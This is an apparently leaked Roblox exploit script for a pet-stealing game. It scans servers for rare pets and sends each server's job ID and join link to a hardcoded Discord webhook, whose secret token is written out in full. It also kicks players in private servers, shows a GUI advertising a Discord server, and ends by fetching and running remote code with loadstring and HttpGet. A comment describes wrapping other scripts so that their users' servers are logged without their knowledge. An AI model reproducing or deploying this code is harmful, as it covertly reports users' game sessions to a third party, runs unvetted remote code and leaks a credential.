-- Leaked by discord.gg/tokinu

--CONFIG
getgenv().webhook = "https://discord.com/api/webhooks/1441927411741495470/KLP5lveYvjDnbU7_zoMUOBR8owoBJGFDxCm-QSWSv7xOCKNrA15Kwf4KkTJ1hN23D8GO"
getgenv().websiteEndpoint = nil

-- Allowed place IDs
local allowedPlaceIds = {
    [96342491571673] = true, -- New Players Server
    [109983668079237] = true -- Normal
}

getgenv().TargetPetNames = {
    "Spaghetti Tualetti",
    "Fragama and Chocrama", "Garama and Madundung", "Spooky and Pumpky",
    "La Casa Boo",
    "Nuclearo Dinossauro",  
    "Capitano Moby", "Los Combinasionas", "Dragon Cannelloni",
    "Headless Horseman", "La Supreme Combinasion", "Esok Sekolah", "Ketupat Kepat",
   
}

-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- PRIVATE SERVER CHECK (works for VIP + Reserved)
local function isPrivateServer()
    return (game.PrivateServerId and game.PrivateServerId ~= "")
        or (game.VIPServerId and game.VIPServerId ~= "")
end

local function buildJoinLink(placeId, jobId)
    return string.format(
        "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
        placeId,
        jobId
    )
end

-- KICK CHECKS
if isPrivateServer() then
    LocalPlayer:Kick("Kicked because in private server")
    return
elseif not allowedPlaceIds[game.PlaceId] then
    local joinLink = buildJoinLink(game.PlaceId, game.JobId)
    LocalPlayer:Kick("Kicked because wrong game\nClick to join server:\n" .. joinLink)
    return
end

-- WEBHOOK SEND
local function sendWebhook(foundPets, jobId)
    local petCounts = {}
    for _, pet in ipairs(foundPets) do
        petCounts[pet] = (petCounts[pet] or 0) + 1
    end

    local formattedPets = {}
    for petName, count in pairs(petCounts) do
        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
    end

    local joinLink = buildJoinLink(game.PlaceId, jobId)

    local embedData = {
        username = "Leaked by tokinu hub gng",
        embeds = { {
            title = "🐾 Pet(s) Found!",
            description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
            color = 65280,
            fields = {
                {
                    name = "Players",
                    value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers),
                    inline = true
                },
                {
                    name = "Job ID",
                    value = jobId,
                    inline = true
                },
                {
                    name = "Join Link",
                    value = string.format("[Click to join server](%s)", joinLink),
                    inline = false
                }
            },
            footer = { text = "Leaked by discord.gg/tokinu gng" },
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    local jsonData = HttpService:JSONEncode(embedData)
    local req = http_request or request or (syn and syn.request)
    if req then
        local success, err = pcall(function()
            req({
                Url = getgenv().webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end)
        if success then
            print("✅ Tokinu Hub Loaded")
        else
            warn("❌ Tokinu Hub failed:", err)
        end
    else
        warn("❌ No HTTP request function available")
    end
end

-- PET CHECK
local function checkForPets()
    local found = {}
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            local nameLower = string.lower(obj.Name)
            for _, target in pairs(getgenv().TargetPetNames) do
                if string.find(nameLower, string.lower(target)) then
                    table.insert(found, obj.Name)
                    break
                end
            end
        end
    end
    return found
end

-- MAIN LOOP
task.spawn(function()
    while true do
        local petsFound = checkForPets()
        if #petsFound > 0 then
            print("✅ OP Server:", table.concat(petsFound, ", "))
            sendWebhook(petsFound, game.JobId)
        else
            print("Public Server Check!")
        end
        task.wait(15)
    end
end)

-- ═════════════════════════════════════════════
-- T O K I N U   H U B   G U I   V3
-- discord.gg/tokinu
-- ═════════════════════════════════════════════

local plr = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "TokinuGangUI"
gui.ResetOnSpawn = false
gui.Parent = plr:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 340, 0, 160)
main.Position = UDim2.new(0.5, -170, 0.8, -80)
main.BackgroundColor3 = Color3.new(0,0,0)
main.BackgroundTransparency = 0.3
main.Active = true
main.Draggable = true
main.Parent = gui

local corner = Instance.new("UICorner", main)
corner.CornerRadius = UDim.new(0, 16)

-- tuff title
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1,0,0.4,0)
title.Position = UDim2.new(0,0,0.08,0)
title.BackgroundTransparency = 1
title.Text = "discord.gg/tokinu"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBlack
title.TextSize = 34
title.TextStrokeTransparency = 0.8

-- bottom text
local bottom = Instance.new("TextLabel", main)
bottom.Size = UDim2.new(1,0,0.3,0)
bottom.Position = UDim2.new(0,0,0.48,0)
bottom.BackgroundTransparency = 1
bottom.Text = "join for the best scripts"
bottom.TextColor3 = Color3.new(0.8,0.8,0.8)
bottom.Font = Enum.Font.GothamBold
bottom.TextSize = 20

-- copy button 
local copy = Instance.new("TextButton", main)
copy.Size = UDim2.new(0,200,0,42)
copy.Position = UDim2.new(0.5,-100,0.7,0)
copy.BackgroundColor3 = Color3.fromRGB(88,101,242)
copy.Text = "COPY INVITE"
copy.TextColor3 = Color3.new(1,1,1)
copy.Font = Enum.Font.GothamBlack
copy.TextSize = 20
Instance.new("UICorner", copy).CornerRadius = UDim.new(0,12)

-- red X
local close = Instance.new("TextButton", main)
close.Size = UDim2.new(0,40,0,40)
close.Position = UDim2.new(1,-48,0,8)
close.BackgroundColor3 = Color3.fromRGB(220,20,20)
close.Text = "X"
close.TextColor3 = Color3.new(1,1,1)
close.Font = Enum.Font.GothamBlack
close.TextSize = 26
Instance.new("UICorner", close).CornerRadius = UDim.new(0,12)

-- copied text
local copied = Instance.new("TextLabel", main)
copied.Size = UDim2.new(1,0,0.2,0)
copied.Position = UDim2.new(0,0,0.92,0)
copied.BackgroundTransparency = 1
copied.Text = ""
copied.TextColor3 = Color3.fromRGB(0,255,0)
copied.Font = Enum.Font.GothamBlack
copied.TextSize = 18

-- copy function
copy.MouseButton1Click:Connect(function()
    setclipboard("https://discord.gg/tokinu")
    copied.Text = "COPIED TWIN"
    task.wait(1.5)
    copied.Text = ""
end)

-- hover effects
copy.MouseEnter:Connect(function() copy.BackgroundColor3 = Color3.fromRGB(110,120,255) end)
copy.MouseLeave:Connect(function() copy.BackgroundColor3 = Color3.fromRGB(88,101,242) end)
close.MouseEnter:Connect(function() close.BackgroundColor3 = Color3.fromRGB(200,0,0) end)
close.MouseLeave:Connect(function() close.BackgroundColor3 = Color3.fromRGB(220,20,20) end)

-- close
close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

print("Tokinu GUI loaded")

-- Script loader (PUT YOUR SCRIPT HERE IT WILL LOAD AND U CAN LOG THEIR PETS)
print("discord.gg/tokinu")
-- Delete this and put it here (THIS ONE IS CHILLI HUB UNDER)
loadstring(game:HttpGet("https://rawscripts.net/raw/Steal-a-Brainrot-Lennon-hub-v5-52358"))()
